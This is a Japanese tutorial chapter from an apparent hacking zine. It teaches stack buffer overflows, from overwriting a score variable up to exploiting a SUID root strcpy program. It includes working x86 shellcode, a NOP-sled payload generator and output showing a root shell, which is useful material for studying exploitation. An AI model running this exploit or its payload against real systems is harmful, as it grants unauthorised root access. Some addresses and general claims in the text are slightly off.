x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x

--- 第○章: はじめてのハッキング　〜バッファオーバフローの利用〜 ---

著者：Defolos

x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x


■0x01.) はじめに

　前回までで、ハッキングの土台となる前提知識を確認し終えました。今回はこ
れまで確認してきたピースを寄せ集め、実際にバッファオーバフローの脆弱性を
利用して侵入を試みます。今回の記事を通して、本レポートの主題である「侵入
」という過程を一通り学んだことになります。


■0x02.) バッファオーバフロー

　侵入につながる脆弱性にはいくつかの種類がありますが、今回はとりわけ有名
かつ致命的な脆弱性であるバッファオーバフローを利用します。

●バッファオーバフローとは

　バッファオーバフロー（Buffer Overflow）は古くから存在の知られる、プログ
ラム言語の仕様とハードウェアメモリの使われ方の脆弱性をうまく利用したハッ
キングテクニックです。バッファオーバフローには主に2つの分類があります。ひ
とつはスタックセグメント上に確保されたバッファを攻撃するスタックバッファ
オーバフローです。もうひとつはヒープセグメント上に確保されたバッファを攻
撃するヒープバッファオーバフローです。
　バッファオーバフローの存在は非常に古くから知られていた脆弱性ですが、そ
の脆弱性がroot権限の奪取に利用できることは1996年に発行されたwebマガジンP
hrackで初めて公になりました。しかしながら、このようなwebマガジンにテクニ
ックが紹介されるのはハッカーがテクニックを使って遊び尽くした後のことでし
ょうから、実際にはより以前からバッファオーバフローのテクニックが悪用され
ていたことでしょう。

●プログラムの落とし穴

　プログラムではバッファ（変数や配列など）を確保し、そのバッファに必要な
データを一時的に溜め込んで処理を行うことが当然のように行われています。し
かし、この過程でバッファに格納するデータのサイズをチェックし忘れると、ro
ot権限を奪取されかねない危険なプログラムが完成してしまいます。特に、プロ
グラミング言語として大きなシェアをもつC言語では、言語の仕様上バッファオー
バフローの脆弱性が生まれやすいようになっています。そのため、世間に出回っ
ているほとんどのプログラムにはバッファオーバフローの脆弱性がひとつぐらい
は存在しています。

○バッファオーバフローの原理

　バッファというのはデータを一時的に保存する領域であることは先程述べまし
た。これは例えばファイルから読み込んだデータを一時的に置いておいたり、キ
ーボードからの入力を貯めておくための領域です。バッファはメモリに確保され
ますが、リスト構造以外のデータ構造をバッファに利用した場合、バッファの大
きさは20バイトや256バイトのように有限です。
　通常、ユーザの名前などを入力させるような場合には20バイトほどのバッファ
を配列で確保します。次の図のようにメモリにバッファが確保されます。

0  1  2  3  4  5  6  7  8  9  10 11 12 13 14 15 16 17 18 19 20 21 22
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
←***********************入力バッファ*********************→

　上の図では0バイト目から20バイト目までを入力バッファとして確保しましたが、
もしここで21バイトの文字列、例えば「abcdefghijklmnopqrstu」という文字列を
バッファに入力したとするとどうなるでしょう。確保したバッファは20バイトで
すので、「t」までしかバッファに入りません。残の1バイト「u」はどこに行って
しまうのでしょうか。
　実は、メモリには次の図のように文字列がコピーされ、残の1バイトは入力バッ
ファに隣接するメモリに上書きされます。

0  1  2  3  4  5  6  7  8  9  10 11 12 13 14 15 16 17 18 19 20 21 22
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|a |b |c |d |e |f |g |h |i |j |k |l |m |n |o |p |q |r |s |t |u |  |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
←***********************入力バッファ*********************→

　「u」が格納されているメモリ領域は、何に使われている領域かは分かりません。
場合によっては他の変数が確保し、データの保持に使っていた領域かも知れませ
ん。下図の例では、入力バッファに隣接するように変数Aの領域がメモリ上に確保
されています。そのうえで、変数Aには30という値が格納されています。図で4つ
の升目を取っているのは、変数Aを4バイトであるとしたためです。

14 15 16 17 18 19 20 21 22 23 24 25 26 27
+--+--+--+--+--+--+--+--+--+--+--+--+--+
|  |  |  |  |  |  |     30    |  |  |  |
+--+--+--+--+--+--+--+--+--+--+--+--+--+
**入力バッファ**→←**変数A*→

　ここに、先程と同じように21文字のデータを入力します。すると、20バイトの
入力バッファに収まりきらなかった1文字が、隣接する変数Aのためのメモリ領域
を侵犯します。

14 15 16 17 18 19 20 21 22 23 24 25 26 27
+--+--+--+--+--+--+--+--+--+--+--+--+--+
|o |p |q |r |s |t |u          |  |  |  |
+--+--+--+--+--+--+--+--+--+--+--+--+--+
**入力バッファ**→←**変数A*→

　このように、変数Aの中身を書き換えてしまいます。変数Aが書き換えられた後
に、変数Aを使ってなんらかの処理をしようとすると、予期せぬ動作を引き起こす
ことになるでしょう。これが、バッファオーバフローの脆弱性です。

○C言語とバッファオーバフローの関係

　C言語で書かれたプログラムには、バッファオーバフローの脆弱性が含まれるこ
とが多いです。というのも、C言語はバッファのサイズチェックを自動では行って
くれず、プログラマがチェックを行わなければならない仕様だからです。例えば、
Strcpy関数は指定されたバッファの内容を指定したバッファにコピーしますが、
コピー先のバッファが十分に大きいかどうかはプログラマがチェックしなければ
なりません。下のサンプルコードでは、7行目のif文でサイズのチェックを行って
います。

-----
int main(int argc, char *argv[]){

    char str1[7] = "Hello!";
    char str2[5];

    //このif文でサイズチェックを行う
    if(sizeof(str1) <= sizeof(str2)){
        strcpy(str2, str1);
    }
    return 0;
}
-----

　このチェックを怠ってしまうと、バッファオーバフローの脆弱性がプログラム
内に混入してしまいます。C言語の、特に文字列操作関数にはstrcpy関数以外にも、
get関数などのサイズチェックを行わない関数が多数存在しています。ゆえに、C
言語で書かれたプログラムには、プログラマの怠慢や無知のためにバッファオー
バフローの脆弱性が含まれていることが多いのです。

●C言語でのサンプル

　より具体的に、バッファオーバフローの脆弱性が問題となるプログラムの例を
示します。下のサンプルコードはゲームのコードの一部ですが、これには重大な
脆弱性が存在しています。ゲームにおいてスコアというのは最も重要視される変
数です。しかし、このコードではスコアを自由に書き換えることができてしまい
ます。

-----
#include <stdio.h>

int main(int argc, char *argv[]){

    int  starge;
    int  score;
    char name[12];

    starge = 1;
    score = 0;

    //game routine

    printf("Please input your name.\n");
    gets(name);
    printf("Score of %s is %d!!\n", name, score);

    return 0;
}
-----

　これをコンパイルし実行すると、次のようにユーザ名をキーボードから入力さ
れるのを待ち受けるようになります。これはゲームでハイスコアを出した時のユ
ーザ名登録を想定しています。

-----
Defolos@glazheim:~$ ./a.exe
Please input your name.
Defolos
Score of Defolos is 0!!
-----

　ユーザ名が入力されると、score変数に格納されているスコアを表示します。本
来はゲームルーチンでスコアが加算されていくのですが、このサンプルではゲー
ムルーチンは省略しているので、スコアは初期値の0のままです。
　ではここに、ユーザ名格納用の配列サイズ以上の文字列を入力したとするとど
うなるでしょう。例えば25文字の文字列を名前として入力したとします。

-----
Defolos@glazheim:~$ ./a.exe
Please input your name.
aaaaaaaaaaaaaaaaaaaaaaaaa
Score of aaaaaaaaaaaaaaaaaaaaaaaaa is 97!!
-----

　本来0であるはずのスコアが、バッファオーバフローのために書き換えられて97
になっています。メモリ内は図1のように、高位アドレスから12バイトのname配列、
12バイトの無割当て領域、int型(4バイト)のscore変数というように割当てられま
す。「a」はASCIIコード表で01100001で表されるため、10進数に直すと97となり
ます。25バイト目からscore変数が始まっているため、24文字のどうでもいい文字
列を格納した後、4バイトでスコアを構成すれば、ほぼ任意の数値にスコアを書き
換えることができます。

（図1）http://ruffnex.oc.to/defolos/text1/figure/ladder.png

　このようにバッファオーバフローの脆弱性は、プログラムの重要なデータを任
意に書き換える余地を与えてしまいます。この例では任意のプログラムの実行と
いう最悪のケースは示されていませんが、バッファオーバフローをうまく利用す
れば、シェル起動プログラムはおろか、どのようなプログラムでも実行すること
が可能なのです。


■0x03.) 侵入

　システムへの侵入とは、コントロール権を得ることだと述べました。そして、
そのコントロール権はroot権限を持った状態でシェルを起動することで得られ、
さらに、SUID rootプログラムの流れを途中で変えてシェルを起動できれば、コン
トロール権を得られることが分かりました。
　後は、いかにしてプログラムの実行の流れを変えるかです。最後のピースはバ
ッファオーバフローをうまく応用することで実現します。ここではその応用例を
見て行くことにしましょう。

●バッファオーバフローの応用

　バッファオーバフローは、隣接する下位番地のメモリ内を上書きできることは
前述の通りです。ここで、関数呼び出しの仕組みについて思い出してください。
関数呼び出しの際には戻り値がメモリ上に確保され、関数の終了時にその戻り値
を参照します。つまり、戻り値をバッファオーバフローで上書きできれば任意の
メモリ番地に制御を移すことができます。

●サンプル

　次のプログラムは、バッファオーバフローによって関数の戻り値を書き換え、
main関数終了時に0x41414141番地に制御を移します。

-----
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]){

    char buffer[8];
    strcpy(buffer, "AAAAAAAAAAAAAAAA");
    return 0;
}
-----

　このプログラムをコンパイルし、実行すると次のようにセグメンテーションフォルトが発生します。

-----
defolos@glazheim:~$ ./a.out
セグメンテーション違反です
-----

　これは、main関数の戻り先としてメモリ内に保存されていた、EIPの保存領域
(SEIP:Saved EIP)がバッファオーバフローによって上書きされたため、main関数
終了時にSEIPに保存されているアドレスへ制御を移そうとした結果です。今回は
SEIPをAAAA(=0x41414141)に書き換えたので、mainから戻る時はメモリの0x41414
141番地を実行しようとします。しかし、0x41414141番地には実行可能な機械語デ
ータが格納されてはおらず、機械語命令には無いビットパターンが構成されてい
ます。故にCPUは0x41414141番地のビットパターンを実行できず、苦肉の策のエラ
ー処理としてセグメンテーションフォルトを発生させます。しかし、もし実行可
能なビットパターンが構成されている番地にSEIPを書き換えることができれば、
その命令を実行することになるのです。

　このように、SEIP領域を書き換えることによって、関数終了時に任意の場所に
制御を移すことができます。これを応用し、プログラムのバッファ内に制御を移
し、そこに実行可能な機械語をデータとして格納すれば、どのようなプログラム
でも実行することができます。

●権限奪取実証のイメージ

　SEIP領域の書き換えによって、プログラムの流れを自由に変えることができる
とわかりました。これをうまく使い、システムのコントロール権をいただく（＝
侵入）ことを実証してみましょう。
　第一章で述べたように、侵入とはコントロール権の奪取であり、コントロール
権は管理者としてシェルを起動することで得られます。さらに、実行時には誰が
実行したかにかかわらず管理者権限で実行されるSUID rootプログラムの存在を示
し、そのプログラムの途中でシェルを起動できればコントロール権を得られると
説明しました。プログラムの流れの変え方を学んだ今、侵入に必要なすべてのパ
ーツがそろったと言えます。

　イメージとしては、SUID rootプログラムのバッファにシェルコードを入れ、そ
の先頭アドレスを、関数の戻り地が保存されたアドレスにバッファオーバフロー
を用いて上書きします。

         buffer                 sfp    seip
--------+----------------------+-----+--------------------+-------
        | shellcode            |     | address of buffer  |
--------+----------------------+-----+--------------------+-------
        ↑                              |
         +------------------------------+

　これで、関数の終了時にretに格納されたアドレス、つまりbufferの先頭であり
shellcodeの先頭に制御が移ります。その結果、root権限でシェルが起動し権限を
奪うことができます。
　このイメージには、ひとつ問題点が有ります。私達はメモリの内容をリアルタ
イムにモニタリングするすべを持っていませんので、bufferの先頭番地が何番な
のか正確にはわからないのです。大まかな場所は予測できても、1バイトもズレず
にbufferの先頭番地を予測するのはあてずっぽうでは限界があります。shellcod
eを実行するには、１バイトの前後も許されません。shellcodeの先頭ぴったりの
アドレスをSEIP領域に書き込まなければなりませんが、これは不可能に近いこと
です。この問題は、実証イメージの具現化にあたって、あるテクニックを使って
解決します。

●コントロール権奪取の実証

　実証のイメージを具現化したものが次のコードです。このコードはコマンドラ
イン引き数の文字列をbufferにコピーするだけのプログラムです。bufferの容量
が500バイトと固定されているので、500バイト以上の文字列を引き数として渡せ
ばバッファオーバフローが発生します。

-----
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]){

    char buffer[500];
    strcpy(buffer, argv[1]);
    return 0;
}
-----

　コンパイル時に名前を「bo-test.exe」にします。その後、SUID rootプログラ
ムにするために所有権をrootに変更し、SUIDビットを起てておきます。このプロ
グラムの入力値として、次のプログラムで生成した文字列を渡します。

-----
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

char shellcode[]=
"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0"
"\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d"
"\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73"
"\x68";

unsigned long sp (void){
    __asm__("movl %esp, %eax");
}

int main (int argc, char *argv[]){

    int i, offset;
    long esp, ret, *addr_ptr;
    char *buffer, *ptr;

    offset = 1000;
    esp = sp();
    ret = esp - offset;

    printf("sp = 0x%x\n", esp);
    printf("ret= 0x%x\n", ret);

    buffer = malloc(600);

    ptr = buffer;
    addr_ptr = (long *)ptr;

    for (i=0; i<600; i += 4){
        *(addr_ptr++) = ret;
    }

    for (i=0; i<200; i++){
        buffer[i] = '\x90';
    }

    ptr = buffer + 200;

    for (i=0; i<strlen(shellcode); i++){
        *(ptr++) = shellcode[i];
    }

    buffer[600 - 1] = 0;

    execl("./bo-test.exe", "bo-test.exe", buffer, 0);

    free(buffer);
    return 0;
}
-----

　この文字列生成プログラムを実行すると、プログラム内で構成したbuffer配列
を引き数としてbo-test.exeを実行します。このソースをexploit.exeとしてコン
パイルし、実行すると結果は次のように、root権限でシェルを起動する結果とな
ります。

-----
defolos@glazheim:~$ exploit.exe
sp = 0xbffff908
ret= 0xbffff520
sh-2.05b#
-----

　ここで注目すべきは、bo-test.exeに渡された文字列です。文字列生成プログラ
ムで600バイトの文字列を生成しているため、バッファオーバフローが発生します。
その結果SEIP領域がretに書き換えられるわけです。

0                   200              246          600
+--------------------+----------------+------------+
|  NOP               | shellcode      |  ret       |
+--------------------+----------------+------------+

○NOP

　NOPはNo Operationの略で、何もしない命令です。何も行わずに次のアドレスに
ある命令を実行するだけの命令で、一見すると利用価値がないようにも見えます。
機械語では0x90に翻訳されます。
　今回は、このNOPが重要なテクニックとして利用されています。NOPは何もせず
に次の命令を実行しますので、NOPの連発の後に実行可能なプログラムを置いてお
けば、どのNOPから処理を始めても最終的にプログラムの先頭にたどり着くのです。

NOP                                 program
+----------------------------------+----------------------+
| nop nop nop ...                  | executable program   |
+----------------------------------+----------------------+
実行→→→→→→→→→→→→→→→→

　このテクニックはNOPスレッドと呼ばれ、プログラムの先頭アドレスを完全には
予測できない場合に多用されるテクニックです。retにNOPスレッドのうちのどれ
かを指定すればプログラムの先頭にたどり着くので、実行したいプログラムを実
行できる可能性が高まります。

○シェルコード

　シェルコードはeggとも呼ばれ、シェルを起動する小さなプログラムです。第一
章で紹介したシェルを起動するプログラムを機械語に変換したもので、その制作
にはアセンブリ言語が使われます。詳細は省きますが、シェルを起動するプログ
ラムを機械語に翻訳したものだと覚えておいてください。このコードを実行する
のが今回の検証の目的です。

○RET

　RETは関数の戻り値として上書きする、ジャンプ先のアドレスです。今回は文字
列生成プログラムで構成したNOPのうちのどれかを指し示すようにします。
　もちろん、あてずっぽうにアドレスを指定しても当たる可能性は低く、実用的
ではありません。そこで、文字列生成プログラムが実行された時のスタックポイ
ンタを予測の足掛かりとします。このスタックポインタにオフセットを減算する
ことでretとして指定すべきアドレスを作ります。今回の例では、適当に1,000バ
イトをオフセットとして利用しました。オフセットの値は試行錯誤して捜し出す
ことになります。

low memory 0x08000000
+---------------+ .text
|               |
+---------------+ .data
|               |
+---------------+ .heap
| nop           |
+               +
|               |
+---------------+
| shellcode     |
+---------------+
|               |
+ ret           +
|               |
+---------------+

+---------------+bo-test.exe main()
|               |　　stackpointer-1064
+   buffer      |
|               |
+---------------+
|   SFP         |
+---------------+
|   RET         |
+---------------+
|   argc(2)     |
+---------------+
|  *argv(buffer)|
+---------------+
|  *argv(name)  |
+---------------+

544バイトのすきま

+---------------+ ←stackpointer exploit.exe main()
|    i          |
+---------------+
|    offset     |
+---------------+
|    esp        |
+---------------+
|    ret        |
+---------------+
|    addr_ptr   |
+---------------+
|    *buffer    |
+---------------+
|    *ptr       |
+---------------+
|   SFP         |
+---------------+
|   RET         |
+---------------+
|   argc        |
+---------------+
|   argv        |
+---------------+
heigh memory (0xbfffffff)

　正確には1,064バイトのオフセットを取ると、bo-test.exe上に確保されたbufer
の先頭に制御が移ります。オフセットを1,064に変更して実行すると次のようにな
ります。

-----
defolos@glazheim:~$ exploit.exe
sp = 0xbffff908
ret= 0xbffff4e0
sh-2.05b#
-----

　ここからNOPスレッドの長さ（200バイト）分だけオフセットの位置を減らして
も大丈夫です。0xbffff4e0に200を加算すると0xbfff5a8ですが、0xbfff5a8はちょ
うどシェルコードの先頭に位置するアドレスですので、シェルコードがうまく起
動します。

-----
defolos@glazheim:~$ exploit.exe
sp = 0xbffff908
ret= 0xbffff5a8
sh-2.05b#
-----

　しかし、もしここから1バイトでもオフセットの値を減らしてしまうと、シェル
コードの途中から実行が開始されることになり、おかしな命令として解釈されて
しまいます。

-----
defolos@glazheim:~$ exploit.exe
sp = 0xbffff908
ret= 0xbffff5a9
不正な命令です
-----

　まとめると、retのアドレスとして0xbffff4e0から0xbffff5a8の間のアドレスを
指定すれば、NOPスレッドに制御が移りシェルコードを実行することができます。
　このretのアドレスも、ひとつだけではSEIP領域を上書きできないかもしれない
ため、立続けに300バイト程用意します。このうちのひとつがSEIP領域を書き換え
ればよいのです。

　この実証で確認できたように、バッファオーバフローによってSEIP領域を書き
換え、アタッカーが用意したシェルを起動するプログラムへ制御を移せば侵入が
可能です。多くのドキュメントで曖昧に言及される「侵入」という過程は、この
ようにプログラミング言語の仕様上の脆弱性を利用することであると言えます。


■0x04.) おわりに

　今回はバッファオーバフローの脆弱性の利用という切り口から、侵入と呼ばれ
る過程の具体的な実例を見てきました。
　次回は、今回すでに用意してあるものとして取り扱ったシェルコードについて
言及します。シェルコードを自らの力で開発できる応用力は、様々なシステムを
攻略できることに直結します。
　それでは、またお会いしましょう。


